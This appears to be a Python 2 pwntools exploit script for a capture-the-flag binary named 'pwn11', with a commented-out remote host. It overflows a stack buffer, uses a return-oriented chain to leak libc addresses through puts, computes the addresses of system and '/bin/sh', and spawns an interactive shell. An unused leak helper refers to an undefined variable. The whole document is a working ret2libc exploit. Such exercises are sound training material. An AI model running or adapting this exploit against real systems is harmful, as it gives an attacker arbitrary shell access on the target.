#!/usr/bin/python2

from pwn import *

sh = process('./pwn11')
#  sh = remote('111.33.164.4',50011)
elf = ELF('./pwn11')
#  libc = ELF('./libc-2.23.so')
libc = ELF('./libc.so')
context.log_level = 'debug'

pop_rdi = 0x004012ab
puts_plt = 0x00401030
puts_got = elf.got['puts']
read_got = elf.got['read']
start_got = elf.got['__libc_start_main']
libc_puts = libc.symbols['puts']
libc_system = libc.symbols['system']
libc_sh = libc.search('/bin/sh').next()
main_addr = 0x00401162

log.info("puts_got => "+hex(puts_got))
log.info("libc_puts => "+hex(libc_puts))
log.info("libc_system => "+hex(libc_system))


sh.recv()
sh.sendline('dyf')

def getPuts():
    print sh.recv()
    sleep(0.5)
    payload = 'a' * 0x20 + 'b' * 8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr) 
    sh.sendline(payload)
    sh.recvuntil('fail!\n')
    puts_addr = u64(sh.recv(6).ljust(8,'\x00'))
    log.info("puts_addr => " + hex(puts_addr))
    return puts_addr

def getstart():
    sh.recv()
    sh.sendline('dyf')
    sleep(0.5)
    payload = 'a' * 0x20 + 'b' * 8 + p64(pop_rdi) + p64(start_got) + p64(puts_plt) + p64(main_addr) 
    sh.sendline(payload)
    sh.recvuntil('fail!\n')
    start_addr = u64(sh.recv(6).ljust(8,'\x00'))
    log.info("start_addr => " + hex(start_addr))
    return start_addr
def leak(address):
    count = 0
    data=''
    payload = 'a' * 0x20 + 'b' * 8 + p64(pop_rdi) + p64(address) + p64(puts_plt) + p64(main_addr)
    sh.sendline(payload)
    print p.recvuntil()

puts_addr = getPuts()
read_addr = getstart()
offset = puts_addr - libc_puts
system_addr = offset + libc_system
bin_sh = offset + libc_sh
log.info("system_addr => " + hex(system_addr))
log.info("bin_sh => " + hex(bin_sh))

sh.recv()
sh.sendline('dyf')
def getShell():
    sh.recv()
    payload = 'a' * 0x20 + 'b' * 8 + p64(pop_rdi) + p64(bin_sh) + p64(system_addr) + p64(main_addr)
    sh.sendline(payload)

getShell()
sh.interactive()




